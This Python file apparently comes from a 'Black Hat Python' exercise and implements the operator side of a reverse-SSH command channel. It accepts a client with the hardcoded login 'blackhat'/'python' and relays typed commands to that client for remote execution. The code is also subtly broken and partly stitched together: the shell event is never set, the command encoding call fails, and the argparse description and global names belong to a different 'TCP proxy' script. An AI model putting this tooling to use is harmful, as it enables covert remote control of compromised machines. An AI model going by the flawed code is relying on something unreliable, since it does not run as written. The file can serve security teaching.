import socket, paramiko, threading, sys, argparse
sys.path.append('..')
from utils import utils

host_key = paramiko.RSAKey(filename="test_rsa.key")

class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()
    
    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    
    def check_auth_password(self, username, password):
        if (username == 'blackhat') and (password == 'python'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

def process_options():
    global listen, port, execute, command, upload_dest, target, upload
    
    parser = argparse.ArgumentParser(description='BHP TCP Proxy Tool')
    parser.add_argument('server', type=str, help='address to listen for connections on')
    parser.add_argument('port', action=utils.ConvertToInt, help='port to listen on')
    args = parser.parse_args()
    
    return (args.server, args.port)

def create_server(server, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, port))
        sock.listen(100)
        print("[+] Listening for connection...")
        client, addr = sock.accept()
    except Exception as e:
        print(("[-] Listen failed: %s" % str(e)))
        sys.exit(1)
    print("[+] Got a connection!")
    
    try:
        bhSession = paramiko.Transport(client)
        bhSession.add_server_key(host_key)
        server = Server()
        
        try:
            bhSession.start_server(server=server)
        except paramiko.SSHException as x:
            print("[-] SSH negotiation failed.")
        
        chan = bhSession.accept(20)
        
        if chan is None:
            print("[-] No channel.")
            sys.exit(1)
        
        print("[+] Authenticated!")
        data = chan.recv(1024)
        print((str(data, 'utf8')))

        server.event.wait(10)
        if not server.event.is_set():
            print("[*] Client never asked for a shell.")
            sys.exit(1)
        
        chan.send("Welcome to BHP_SSH")
        
        while True:
            try:
                command = input("Enter a command: ").strip('\n')
                if command != 'exit':
                    chan.send(bytes(str(command, 'utf8')))
                    data = chan.recv(1024)
                    print(("%s\n" % str(data, 'utf8')))
                else:
                    chan.send(bytes("exit", 'utf8'))
                    print("exiting")
                    bhSession.close()
                    raise Exception("exit")
            except KeyboardInterrupt:
                bhSession.close()
    except Exception as e:
        print(("[-] Caught exception: %s" % str(e)))
        try:
            if bhSession: bhSession.close()
        except:
            pass
        sys.exit(1)

if __name__ == '__main__':
    server, port = process_options()
    create_server(server, port)
